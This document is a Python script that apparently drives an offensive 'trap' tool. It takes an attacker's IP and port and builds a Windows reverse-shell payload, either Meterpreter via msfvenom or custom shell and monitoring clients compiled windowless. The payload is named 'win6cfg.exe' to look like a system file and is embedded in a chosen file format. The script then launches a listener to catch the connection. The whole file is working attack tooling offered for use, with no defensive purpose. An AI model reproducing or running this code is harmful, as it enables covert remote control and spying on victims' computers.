from os import system
from Scripts.Trap import *

#file choosing
banner(); line()
Liste_of_options();print("\n")
file_choise = int(input("set> the file format : ")); line()

#payload choosing
Liste_of_payloads()
pay_choise = int(input("chose the built-in payloads : "))

#enter Ip, port, and the output file name
Ip = input("set> IP address for the payload listener (LHOST) :"); line()
port = int(input("set> The port to connect back to :")); line()
name = input("set> The File Name :"); line()

print_wait()


#preparing the payload
if(pay_choise == 1):
 	payload = "windows/meterpreter/reverse_tcp"
 	system(("msfvenom -p {payload} LHOST={Ip}  LPORT={port} -f exe -o win6cfg.exe").format(payload = payload,Ip = Ip,port = port))
elif(pay_choise == 2):
    exe_prepare("./Scripts/shell_server.py", Ip, port)
    exe_prepare("./Scripts/shell_client.py", Ip, port)
    system("wine python.exe -m PyInstaller Scripts/shell_client.py --onefile --noconsole")
    system("mv dist/shell_client.exe win6cfg.exe")
elif(pay_choise == 3):
    exe_prepare("./Scripts/monitor_server.py", Ip, port)
    exe_prepare("./Scripts/monitor_client.py", Ip, port)
    system(('wine python.exe -m PyInstaller Scripts/monitor_client.py --onefile --noconsole'))
    system("mv dist/monitor_client.exe win6cfg.exe")
else:
    print("invalid payload number!!")
    exit()

extension = set_extension(file_choise)
root_file = set_file(file_choise)
if (extension == "Invalid file choice"):
    print(extension)
    exit()

init_prepare(name, extension, root_file, 2)
generate(name, extension)
system(("mv {name}.{ex} {root_f}").format(root_f=root_file, name=name, ex=extension))

print ("[!] Your file is at output directory")

if (pay_choise == 1):
    system(('msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set Lhost {Ip}; set LPORT {port}; run"').format(Ip=Ip, port=port))
elif (pay_choise == 2):
	system("python3 Scripts/shell_server.py")
elif (pay_choise == 3) :
	system("./Scripts/monitor_server.py")
